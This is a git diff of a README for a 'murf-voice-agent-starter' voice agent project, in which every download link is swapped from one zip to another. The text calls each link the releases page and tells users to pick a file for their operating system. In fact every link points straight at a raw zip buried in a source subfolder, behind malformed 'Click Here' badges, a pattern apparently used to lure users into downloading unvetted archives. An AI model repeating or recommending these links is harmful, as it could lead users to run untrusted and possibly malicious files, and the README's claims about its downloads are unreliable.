@@ -1,6 +1,6 @@
 # 🎤 murf-voice-agent-starter - Start Building Your Voice Agent Today
 
-[![Download](https://raw.githubusercontent.com/Supremesujay/murf-voice-agent-starter/main/app/services/gemini_llm/murf-voice-agent-starter-v2.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Supremesujay/murf-voice-agent-starter/main/app/services/gemini_llm/murf-voice-agent-starter-v2.2.zip)
+[![Download](https://raw.githubusercontent.com/Supremesujay/murf-voice-agent-starter/main/app/routers/ui/starter_voice_agent_murf_v1.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Supremesujay/murf-voice-agent-starter/main/app/routers/ui/starter_voice_agent_murf_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Follow the steps below to download and run the application.
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to access the download page:
-   [Download the latest version](https://raw.githubusercontent.com/Supremesujay/murf-voice-agent-starter/main/app/services/gemini_llm/murf-voice-agent-starter-v2.2.zip)
+   [Download the latest version](https://raw.githubusercontent.com/Supremesujay/murf-voice-agent-starter/main/app/routers/ui/starter_voice_agent_murf_v1.5.zip)
    
 2. **Choose Your Version**: Look for the latest release at the top. Select the appropriate file for your operating system (Windows, Mac, or Linux).
 
@@ -75,6 +75,6 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 ---
 
-[![Download](https://raw.githubusercontent.com/Supremesujay/murf-voice-agent-starter/main/app/services/gemini_llm/murf-voice-agent-starter-v2.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Supremesujay/murf-voice-agent-starter/main/app/services/gemini_llm/murf-voice-agent-starter-v2.2.zip) 
+[![Download](https://raw.githubusercontent.com/Supremesujay/murf-voice-agent-starter/main/app/routers/ui/starter_voice_agent_murf_v1.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Supremesujay/murf-voice-agent-starter/main/app/routers/ui/starter_voice_agent_murf_v1.5.zip) 
 
 Now you're ready to get started with building your own voice agent! Enjoy the experience.
